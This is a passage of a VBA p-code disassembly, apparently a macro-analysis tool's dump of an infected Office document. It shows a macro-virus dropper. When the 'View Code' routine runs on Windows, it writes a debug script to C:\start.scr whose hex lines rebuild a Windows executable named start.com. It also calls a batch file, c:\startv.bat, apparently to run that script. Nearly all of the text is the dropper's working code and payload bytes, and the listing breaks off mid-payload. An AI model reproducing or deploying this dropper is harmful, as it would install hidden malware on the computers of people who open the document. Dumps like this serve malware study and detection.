' 	EndSub 
' Line #140:
' 	FuncDefn (Sub ViewVBCode())
' Line #141:
' 	OnError (Resume Next) 
' Line #142:
' 	ArgsCall Umang_Fa 0x0000 
' Line #143:
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "C:\start.scr"
' 	ArgsCall (Call) p5687 0x0001 
' 	EndIf 
' Line #144:
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000D "c:\startv.bat"
' 	ArgsCall (Call) startv 0x0001 
' 	EndIf 
' Line #145:
' 	ArgsCall (Call) pesen 0x0000 
' Line #146:
' 	EndSub 
' Line #147:
' 	FuncDefn (Sub p5687(strFile As String))
' Line #148:
' 	OnError (Resume Next) 
' Line #149:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #150:
' 	Ld Friend 
' 	St hFile 
' Line #151:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #152:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "N start.com"
' 	PrintItemNL 
' Line #153:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0100 4D 5A 36 01 01 00 00 00 04 00 00 00 FF FF 00 00"
' 	PrintItemNL 
' Line #154:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0110 B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #155:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #156:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0130 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00"
' 	PrintItemNL 
' Line #157:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0140 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68"
' 	PrintItemNL 
' Line #158:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0150 69 73 20 70 72 6F 67 72 61 6D 20 72 65 71 75 69"
' 	PrintItemNL 
' Line #159:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0160 72 65 73 20 4D 69 63 72 6F 73 6F 66 74 20 57 69"
' 	PrintItemNL 
' Line #160:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0170 6E 64 6F 77 73 2E 0D 0A 24 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #161:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0180 4E 45 05 3C 9F 00 0F 00 00 00 00 00 02 03 02 00"
' 	PrintItemNL 
' Line #162:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0190 00 04 00 14 1A 00 01 00 00 00 02 00 02 00 02 00"
' 	PrintItemNL 
' Line #163:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01A0 3D 00 40 00 50 00 85 00 8E 00 92 00 2E 01 00 00"
' 	PrintItemNL 
' Line #164:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01B0 02 00 04 00 00 00 02 08 18 00 0C 01 00 00 0A 03"
' 	PrintItemNL 
' Line #165:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01C0 1A 00 39 0C 50 1D 39 0C F6 00 94 02 51 0C 94 02"
' 	PrintItemNL 
' Line #166:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01D0 04 00 0E 80 01 00 00 00 00 00 24 01 02 00 30 1C"
' 	PrintItemNL 
' Line #167:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01E0 2C 00 00 00 00 00 03 80 01 00 00 00 00 00 26 01"
' 	PrintItemNL 
' Line #168:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01F0 2F 00 30 1C 01 80 00 00 00 00 00 00 08 41 4C 4F"
' 	PrintItemNL 
' Line #169:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0200 41 50 49 43 4F 05 41 4C 4F 41 50 00 00 00 01 00"
' 	PrintItemNL 
' Line #170:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0210 08 00 00 06 4B 45 52 4E 45 4C 04 55 53 45 52 02"
' 	PrintItemNL 
' Line #171:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0220 FF 01 CD 3F 01 16 0A 01 CD 3F 01 18 0B 00 15 41"
' 	PrintItemNL 
' Line #172:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0230 20 6D 69 6E 69 6D 75 6D 20 41 70 70 6C 69 63 61"
' 	PrintItemNL 
' Line #173:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0240 74 69 6F 6E 00 00 09 45 58 43 49 54 50 52 4F 43"
' 	PrintItemNL 
' Line #174:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0250 02 00 15 4F 56 45 52 4C 41 50 50 45 44 57 49 4E"
' 	PrintItemNL 
' Line #175:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0260 44 4F 57 50 52 4F 43 31 01 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #176:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0270 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #177:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0280 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #178:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #179:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #180:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02B0 FF FF B0 FF 50 9A DD 01 3C 0B 33 ED 55 9A FF FF"
' 	PrintItemNL 
' Line #181:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02C0 00 00 0B C0 74 EC 8C 06 46 00 81 C1 00 01 72 E2"
' 	PrintItemNL 
' Line #182:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02D0 89 0E 10 00 89 36 12 00 89 3E 14 00 89 1E 16 00"
' 	PrintItemNL 
' Line #183:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02E0 8C 06 18 00 89 16 1A 00 9A FF FF 00 00 86 C4 A3"
' 	PrintItemNL 
' Line #184:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02F0 48 00 B4 30 2E F7 06 10 00 01 00 74 07 9A FF FF"
' 	PrintItemNL 
' Line #185:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0300 00 00 EB 02 CD 21 A3 4C 00 86 C4 A3 4A 00 2E F7"
' 	PrintItemNL 
' Line #186:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0310 06 10 00 01 00 75 05 B0 00 A2 4F 00 33 C0 50 9A"
' 	PrintItemNL 
' Line #187:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0320 FF FF 00 00 FF 36 14 00 9A FF FF 00 00 0B C0 74"
' 	PrintItemNL 
' Line #188:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0330 81 9A F0 00 18 00 9A D4 02 94 00 9A 56 04 99 00"
' 	PrintItemNL 
' Line #189:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0340 E8 43 07 FF 36 84 00 FF 36 82 00 FF 36 80 00 9A"
' 	PrintItemNL 
' Line #190:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0350 C4 00 9E 00 83 C4 06 50 9A CF 01 B2 00 B8 15 00"
' 	PrintItemNL 
' Line #191:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0360 E9 28 04 00 8C D8 90 45 55 8B EC 1E 8E D8 FF 36"
' 	PrintItemNL 
' Line #192:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0370 14 00 FF 36 12 00 FF 36 18 00 FF 36 16 00 FF 36"
' 	PrintItemNL 
' Line #193:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0380 1A 00 9A F0 08 BB 00 83 ED 02 8B E5 1F 5D 4D CB"
' 	PrintItemNL 
' Line #194:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0390 8C D8 90 45 55 8B EC 1E 8E D8 B8 00 35 2E F7 06"
' 	PrintItemNL 
' Line #195:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03A0 10 00 01 00 74 07 9A 5E 00 00 00 EB 02 CD 21 89"
' 	PrintItemNL 
' Line #196:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03B0 1E 32 00 8C 06 34 00 0E 1F B8 00 25 BA E6 04 2E"
' 	PrintItemNL 
' Line #197:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03C0 F7 06 10 00 01 00 74 07 9A 07 01 00 00 EB 02 CD"
' 	PrintItemNL 
' Line #198:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03D0 21 16 1F 8B 0E 1E 01 E3 29 8E 06 46 00 26 8B 36"
' 	PrintItemNL 
' Line #199:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03E0 2C 00 A1 20 01 8B 16 22 01 33 DB FF 1E 1C 01 73"
' 	PrintItemNL 
' Line #200:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03F0 03 E9 7A 01 A1 24 01 8B 16 26 01 BB 03 00 FF 1E"
' 	PrintItemNL 
' Line #201:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0400 1C 01 8E 06 46 00 26 8B 0E 2C 00 E3 3E 8E C1 33"
' 	PrintItemNL 
' Line #202:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0410 FF 26 80 3D 00 74 34 B9 0D 00 BE 24 00 F3 A6 74"
' 	PrintItemNL 
' Line #203:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0420 0B B9 FF 7F 33 C0 F2 AE 75 21 EB E5 06 1E 07 1F"
' 	PrintItemNL 
' Line #204:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0430 8B F7 BF 58 00 B1 04 AC 2C 41 72 0D D2 E0 92 AC"
' 	PrintItemNL 
' Line #205:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0440 2C 41 72 05 0A C2 AA EB EE 16 1F BE 28 01 BF 28"
' 	PrintItemNL 
' Line #206:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0450 01 E8 E2 00 BE 28 01 BF 28 01 E8 D9 00 BE 28 01"
' 	PrintItemNL 
' Line #207:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0460 BF 28 01 E8 D0 00 83 ED 02 8B E5 1F 5D 4D CB 8C"
' 	PrintItemNL 
' Line #208:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0470 D8 90 45 55 8B EC 1E 8E D8 33 C9 EB 2F 8C D8 90"
' 	PrintItemNL 
' Line #209:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0480 45 55 8B EC 1E 8E D8 B9 01 00 EB 20 8C D8 90 45"
' 	PrintItemNL 
' Line #210:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0490 55 8B EC 1E 8E D8 56 57 B9 00 01 EB 0F 8C D8 90"
' 	PrintItemNL 
' Line #211:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04A0 45 55 8B EC 1E 8E D8 56 57 B9 01 01 88 2E 8D 00"
' 	PrintItemNL 
' Line #212:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04B0 51 0A C9 75 1C BE 8A 02 BF 8A 02 E8 78 00 BE 28"
' 	PrintItemNL 
' Line #213:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04C0 01 BF 28 01 E8 6F 00 8B 76 06 56 E8 B8 05 83 C4"
' 	PrintItemNL 
' Line #214:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04D0 02 BE 28 01 BF 28 01 E8 5C 00 BE 28 01 BF 28 01"
' 	PrintItemNL 
' Line #215:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04E0 E8 53 00 E8 27 00 58 0A E4 75 17 8B 46 06 B4 4C"
' 	PrintItemNL 
' Line #216:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04F0 2E F7 06 10 00 01 00 74 07 9A 29 01 00 00 EB 02"
' 	PrintItemNL 
' Line #217:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0500 CD 21 5F 5E 83 ED 02 8B E5 1F 5D 4D CB 8B 0E 1E"
' 	PrintItemNL 
' Line #218:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0510 01 E3 07 BB 02 00 FF 1E 1C 01 1E C5 16 32 00 B8"
' 	PrintItemNL 
' Line #219:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0520 00 25 2E F7 06 10 00 01 00 74 07 9A 5A 02 00 00"
' 	PrintItemNL 
' Line #220:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0530 EB 02 CD 21 1F C3 3B F7 73 0E 83 EF 04 8B 05 0B"
' 	PrintItemNL 
' Line #221:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0540 45 02 74 F2 FF 1D EB EE C3 00 8C D8 90 45 55 8B"
' 	PrintItemNL 
' Line #222:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0550 EC 1E 8E D8 B8 FC 00 50 0E E8 A9 02 B8 FF 00 50"
' 	PrintItemNL 
' Line #223:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0560 0E E8 A1 02 83 ED 02 8B E5 1F 5D 4D CB 00 B8 02"
' 	PrintItemNL 
' Line #224:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0570 00 E9 17 02 8F 06 92 00 8F 06 94 00 B8 04 01 B9"
' 	PrintItemNL 
' Line #225:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0580 08 00 E8 BD 02 89 16 88 00 A3 86 00 52 50 FF 36"
' 	PrintItemNL 
' Line #226:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0590 14 00 52 50 B8 04 01 50 9A FF FF 00 00 5B 07 03"
' 	PrintItemNL 
' Line #227:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05A0 D8 26 C6 07 00 BA 01 00 BF 01 00 BE 81 00 8E 1E"
' 	PrintItemNL 
' Line #228:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05B0 46 00 AC 3C 20 74 FB 3C 09 74 F7 3C 0D 74 6F 0A"
' 	PrintItemNL 
' Line #229:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05C0 C0 74 6B 47 4E AC 3C 20 74 E8 3C 09 74 E4 3C 0D"
' 	PrintItemNL 
' Line #230:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05D0 74 5C 0A C0 74 58 3C 22 74 24 3C 5C 74 03 42 EB"
' 	PrintItemNL 
' Line #231:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05E0 E4 33 C9 41 AC 3C 5C 74 FA 3C 22 74 04 03 D1 EB"
' 	PrintItemNL 
' Line #232:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05F0 D3 8B C1 D1 E9 13 D1 A8 01 75 CA EB 01 4E AC 3C"
' 	PrintItemNL 
' Line #233:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0600 0D 74 2B 0A C0 74 27 3C 22 74 BA 3C 5C 74 03 42"
' 	PrintItemNL 
' Line #234:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0610 EB EC 33 C9 41 AC 3C 5C 74 FA 3C 22 74 04 03 D1"
' 	PrintItemNL 
' Line #235:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0620 EB DB 8B C1 D1 E9 13 D1 A8 01 75 D2 EB 97 16 1F"
' 	PrintItemNL 
' Line #236:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0630 89 3E 80 00 03 D7 47 D1 E7 03 D7 42 80 E2 FE 2B"
' 	PrintItemNL 
' Line #237:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0640 E2 8B C4 A3 82 00 8B D8 03 FB 16 07 C5 36 86 00"
' 	PrintItemNL 
' Line #238:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0650 36 89 37 43 43 36 8E 1E 46 00 BE 81 00 EB 03 33"
' 	PrintItemNL 
' Line #239:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0660 C0 AA AC 3C 20 74 FB 3C 09 74 F7 3C 0D 74 7C 0A"
' 	PrintItemNL 
' Line #240:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0670 C0 74 78 36 89 3F 43 43 4E AC 3C 20 74 E1 3C 09"
' 	PrintItemNL 
' Line #241:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0680 74 DD 3C 0D 74 62 0A C0 74 5E 3C 22 74 27 3C 5C"
' 	PrintItemNL 
' Line #242:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0690 74 03 AA EB E4 33 C9 41 AC 3C 5C 74 FA 3C 22 74"
' 	PrintItemNL 
' Line #243:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06A0 06 B0 5C F3 AA EB D1 B0 5C D1 E9 F3 AA 73 06 B0"
' 	PrintItemNL 
' Line #244:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06B0 22 AA EB C5 4E AC 3C 0D 74 2E 0A C0 74 2A 3C 22"
' 	PrintItemNL 
' Line #245:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06C0 74 B7 3C 5C 74 03 AA EB EC 33 C9 41 AC 3C 5C 74"
' 	PrintItemNL 
' Line #246:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06D0 FA 3C 22 74 06 B0 5C F3 AA EB D9 B0 5C D1 E9 F3"
' 	PrintItemNL 
' Line #247:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06E0 AA 73 96 B0 22 AA EB CD 33 C0 AA 16 1F C7 07 00"
' 	PrintItemNL 
' Line #248:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06F0 00 FF 2E 92 00 00 8C D8 90 45 55 8B EC 1E 8E D8"
' 	PrintItemNL 
' Line #249:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0700 1E 9A FF FF 00 00 0B C0 74 03 BA 00 00 8B DA 8E"
' 	PrintItemNL 
' Line #250:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0710 C2 33 C0 33 F6 33 FF B9 FF FF 0B DB 74 0E 26 80"
' 	PrintItemNL 
' Line #251:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0720 3E 00 00 00 74 06 F2 AE 46 AE 75 FA 8B C7 40 24"
' 	PrintItemNL 
' Line #252:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0730 FE 46 8B FE D1 E6 B9 09 00 E8 06 01 50 8B C6 E8"
' 	PrintItemNL 
' Line #253:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0740 00 01 A3 84 00 06 1E 07 1F 8B CF 8B D8 33 F6 5F"
' 	PrintItemNL 
' Line #254:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0750 49 E3 26 8B 04 36 3B 06 24 00 75 10 51 56 57 BF"
' 	PrintItemNL 
' Line #255:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0760 24 00 B9 06 00 F3 A7 5F 5E 59 74 05 26 89 3F 43"
' 	PrintItemNL 
' Line #256:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0770 43 AC AA 0A C0 75 FA E2 DA 26 89 0F 1F 83 ED 02"
' 	PrintItemNL 
' Line #257:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0780 8B E5 1F 5D 4D CB 16 1F B8 03 00 50 50 0E E8 B9"
' 	PrintItemNL 
' Line #258:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0790 FD 0E E8 70 00 0E E8 35 00 33 DB 0B C0 74 1D 8B"
' 	PrintItemNL 
' Line #259:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07A0 F8 B8 09 00 80 3D 4D 75 03 B8 0F 00 03 F8 57 1E"
' 	PrintItemNL 
' Line #260:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07B0 07 B0 0D B9 22 00 F2 AE 88 5D FF 58 53 1E 50 9A"
' 	PrintItemNL 
' Line #261:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07C0 FF FF 00 00 B8 FF 00 50 9A FF FF 00 00 00 8C D8"
' 	PrintItemNL 
' Line #262:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07D0 90 45 55 8B EC 1E 8E D8 56 57 1E 07 8B 56 06 BE"
' 	PrintItemNL 
' Line #263:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07E0 30 01 AD 3B C2 74 10 40 96 74 0C 97 33 C0 B9 FF"
' 	PrintItemNL 
' Line #264:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07F0 FF F2 AE 8B F7 EB EB 96 5F 5E 83 ED 02 8B E5 1F"
' 	PrintItemNL 
' Line #265:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0800 5D 4D CA 02 00 8C D8 90 45 55 8B EC 1E 8E D8 57"
' 	PrintItemNL 
' Line #266:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0810 83 3E 9C 00 00 74 1F FF 76 06 0E E8 B0 FF 0B C0"
' 	PrintItemNL 
' Line #267:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0820 74 14 92 8B FA 33 C0 B9 FF FF F2 AE F7 D1 49 8B"
' 	PrintItemNL 
' Line #268:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0830 1E 52 00 E8 55 02 5F 83 ED 02 8B E5 1F 5D 4D CA"
' 	PrintItemNL 
' Line #269:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0840 02 00 55 8B EC 53 06 51 B9 00 10 87 0E 96 00 51"
' 	PrintItemNL 
' Line #270:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0850 50 9A F2 07 E5 00 5B 8F 06 96 00 59 8C DA 0B C0"
' 	PrintItemNL 
' Line #271:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0860 74 04 07 5B EB 05 8B C1 E9 20 FF 8B E5 5D C3 00"
' 	PrintItemNL 
' Line #272:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0870 51 57 F6 47 02 01 74 63 E8 E7 00 8B FE 8B 04 A8"
' 	PrintItemNL 
' Line #273:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0880 01 74 03 2B C8 49 41 41 8B 77 04 0B F6 74 4C 03"
' 	PrintItemNL 
' Line #274:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0890 CE 73 09 33 C0 BA F0 FF E3 30 EB 3F 16 07 26 A1"
' 	PrintItemNL 
' Line #275:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08A0 96 00 3D 00 10 74 16 BA 00 80 3B D0 72 06 D1 EA"
' 	PrintItemNL 
' Line #276:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08B0 75 F8 EB 22 83 FA 08 72 1D D1 E2 8B C2 48 8B D0"
' 	PrintItemNL 
' Line #277:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08C0 03 C1 73 02 33 C0 F7 D2 23 C2 52 E8 2E 00 5A 73"
' 	PrintItemNL 
' Line #278:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08D0 0D 83 FA F0 74 05 B8 10 00 EB E2 F9 EB 1B 8B D0"
' 	PrintItemNL 
' Line #279:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08E0 2B 57 04 89 47 04 89 7F 0A 8B 77 0C 4A 89 14 42"
' 	PrintItemNL 
' Line #280:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08F0 03 F2 C7 04 FE FF 89 77 0C 5F 59 C3 8B D0 F6 47"
' 	PrintItemNL 
' Line #281:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0900 02 04 74 02 EB 51 52 51 53 8B 77 06 2E 8B 1E 10"
' 	PrintItemNL 
' Line #282:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0910 00 33 C9 0B D2 75 07 F7 C3 10 00 75 40 41 B8 02"
' 	PrintItemNL 
' Line #283:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0920 00 F7 C3 01 00 75 03 B8 20 00 56 51 52 50 9A FF"
' 	PrintItemNL 
' Line #284:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0930 FF 00 00 0B C0 74 26 3B C6 75 1C 56 9A FF FF 00"
' 	PrintItemNL 
' Line #285:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0940 00 0B D0 74 12 5B 59 5A 8B C2 F6 47 02 04 74 04"
' 	PrintItemNL 
' Line #286:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0950 4A 89 57 FE F8 EB 0A B8 12 00 E9 2E FE 5B 59 5A"
' 	PrintItemNL 
' Line #287:
' 	Ld hFile 
